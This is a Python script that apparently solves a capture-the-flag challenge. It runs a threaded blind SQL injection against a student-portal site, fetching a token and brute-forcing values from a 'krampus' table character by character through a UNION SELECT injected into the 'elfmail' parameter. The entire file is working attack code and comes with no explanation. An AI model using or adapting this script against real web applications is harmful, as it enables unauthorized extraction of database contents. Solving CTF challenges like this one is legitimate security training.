import requests
import threading
import queue
import bs4
import urllib.parse
import sys

char_set = list("./0123456789abcdefghijklmnopqrstuvwxyz")
payloads = ['']
results = []
que = queue.Queue()
threads = []


def sql_dump(table_name, column_name, payload):
    for char in char_set:
        x = threading.Thread(target=lambda que,
                             table_name, column_name,
                             payload, char:
                             que.put(sql_query(table_name, column_name,
                                             payload, char)),
                             args=(que, table_name, column_name,
                                   payload, char))
        threads.append(x)
        x.start()
    for thread in threads:
        thread.join()
    temp = []
    while not que.empty():
        temp.append(que.get())
        threads.pop()
    if True not in temp:
        results.append(payload)

def get_token():
    validator_req = "https://studentportal.elfu.org/validator.php"
    validator_res = requests.get(validator_req)
    token = validator_res.content.decode('utf-8').replace('=','%3D')
    return token
       
def sql_query(table_name, column_name, payload, char):
    query = "asdifj' UNION SELECT " + column_name + " FROM " + table_name + \
            " WHERE " + column_name + " LIKE '" + payload + char + "%"
    query = urllib.parse.quote(query)

    application_req = "https://studentportal.elfu.org/application-check.php"
    application_req += "?token=" + get_token() + "&elfmail=" + query
    application_res = requests.get(application_req)

    response = bs4.BeautifulSoup(application_res.content, features="html.parser").p.text.strip()
    if response != "No application found!":
        payloads.append(payload + char)
        print(payload + char + '\n', end='')
        return True
    return False
    

table_name = 'krampus'
column_name = 'path'
while payloads:
    payload = payloads.pop(0)
    sql_dump(table_name, column_name, payload)
print(results)
